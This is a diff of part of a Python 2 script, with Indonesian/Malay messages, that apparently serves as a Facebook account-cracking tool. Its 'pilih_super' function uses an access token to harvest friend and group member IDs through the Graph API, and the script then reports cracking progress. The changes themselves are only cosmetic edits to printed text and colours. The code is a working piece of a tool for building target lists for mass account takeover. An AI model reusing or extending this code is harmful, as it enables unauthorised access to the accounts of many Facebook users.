@@ -278,12 +278,12 @@ def pilih_super():
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mNama teman\033[1;91m :\033[0;1m "+op["name"]
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mNAMA TEMAN\033[1;91m :\033[0;1m "+op["name"]
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✓] \033[32;1mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✓] \033[32;1mMENGAMBIL ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -299,7 +299,7 @@ def pilih_super():
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			raw_input("\n\033[1;96m[\033[1;97mKEMBALI\033[1;96m]")
 			super()
 		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
@@ -330,9 +330,9 @@ def pilih_super():
 		print("\r\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m[!] \x1b[0;1mSabar bosku,orang sabar di sayang Bapak/Ibu ✓')
-        print 42*"\033[1;96m-"
-        print('\x1b[1;96mTobat la best Bulan RAMADHAN ini la :v                    ')
-        print('\x1b[1;96mBERSIH KAN GALERI KAU DARI VIDIO ***** TU :v              ')
+        print 42*"\033[1;91m="
+        print('\x1b[32;1mTobat la best Bulan RAMADHAN ini la :v                    ')
+        print('\x1b[32;1mBERSIH KAN GALERI KAU DARI VIDIO ***** TU :v              ')
         print 42*"\033[1;96m="
 	
        		
